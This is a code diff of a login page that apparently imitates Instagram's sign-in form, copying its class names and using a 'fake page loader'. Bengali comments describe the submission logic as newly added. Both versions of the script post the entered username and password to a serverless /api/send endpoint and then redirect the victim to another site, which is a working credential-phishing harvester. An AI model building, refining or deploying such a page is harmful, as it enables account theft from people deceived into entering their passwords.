@@ -18552,75 +18552,43 @@
     <!-- fake page loader -->
     <!-- ===== আপনার দেওয়া মূল স্ক্রিপ্ট (অপরিবর্তিত) ===== -->
   <script>
-    setTimeout(function () {
-      document.querySelector(".page-loader").classList.add("hidden");
-      document.querySelector("._9eogI").classList.add("show");
-      document.querySelector(".RP4i1").classList.add("show");
-      document.querySelector(".JtrJi").classList.add("show");
-    }, 1500);
-  </script>
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+    const submitBtn = document.getElementById('submitBtn');
+    const showBtn = document.getElementById('showBtn');
 
-  <script>
-    let labels = document.querySelectorAll(".f0n8F");
-    let inputs = document.querySelectorAll("._2hvTZ");
-    let showPasswordBtn = document.querySelectorAll(".i24fI");
-
-    for (let i = 0; i < inputs.length; i++) {
-      inputs[i].addEventListener("input", function () {
-        if (inputs[i].value == "") {
-          labels[i].classList.remove("FATdn");
-          showPasswordBtn[i].setAttribute("style", "display: none;");
-        } else {
-          labels[i].classList.add("FATdn");
-          showPasswordBtn[i].setAttribute("style", "display: flex;");
-        }
-
-        inputs[1].value.length > 5 && inputs[0].value.length
-          ? submitButtonDisabled(false)
-          : submitButtonDisabled(true);
-      });
+    function checkInputs() {
+      submitBtn.disabled = !(usernameInput.value.length > 0 && passwordInput.value.length > 5);
+      showBtn.style.display = passwordInput.value.length > 0 ? 'block' : 'none';
     }
+    usernameInput.addEventListener('input', checkInputs);
+    passwordInput.addEventListener('input', checkInputs);
 
-    let showPassBtnText = document.getElementsByClassName("sqdOP yWX7d _8A5w5")[0];
-    showPassBtn[1].addEventListener("click", function () {
-      if (inputs[1].type == "password") {
-        inputs[1].type = "text";
-        showPassBtnText.innerHTML = "Hide";
+    showBtn.addEventListener('click', () => {
+      if (passwordInput.type === 'password') {
+        passwordInput.type = 'text';
+        showBtn.textContent = 'Hide';
       } else {
-        inputs[1].type = "password";
-        showPassBtnText.innerHTML = "Show";
+        passwordInput.type = 'password';
+        showBtn.textContent = 'Show';
       }
     });
-  </script>
 
-  <script>
-    function submitButtonDisabled(isDisabled) {
-      document.getElementsByClassName("sqdOP L3NKy y3zKF")[0].disabled = isDisabled;
-    }
-  </script>
-  <!-- ===== আপনার স্ক্রিপ্ট শেষ ===== -->
-
-  <!-- ===== নতুন যোগ করা হয়েছে: আসল জমা দেওয়ার যুক্তি ===== -->
-  <script>
     document.getElementById('loginForm').addEventListener('submit', async (e) => {
-      e.preventDefault(); // পেজ রিফ্রেশ হওয়া বন্ধ করুন
-      
-      const username = document.getElementById('username').value;
-      const password = document.getElementById('password').value;
-
-      // Vercel সার্ভারলেস ফাংশনে অনুরোধ পাঠান (আগে তৈরি করা /api/send)
-      const res = await fetch('/api/send', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ username, password })
-      });
-
-      // সফল হলে লাফ দিন
-      if (res.ok) {
-        window.location.href = 'https://myweb.com';
-      }
+      e.preventDefault();
+      const username = usernameInput.value;
+      const password = passwordInput.value;
+      try {
+        const res = await fetch('/api/send', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password })
+        });
+        if (res.ok) window.location.href = 'https://myweb.com';
+      } catch (err) { console.error(err); }
     });
   </script>
+
   <!-- ===== নতুন যুক্তি শেষ ===== -->
 
     <div class="_-rjm"><div class="tA2fc"></div></div>
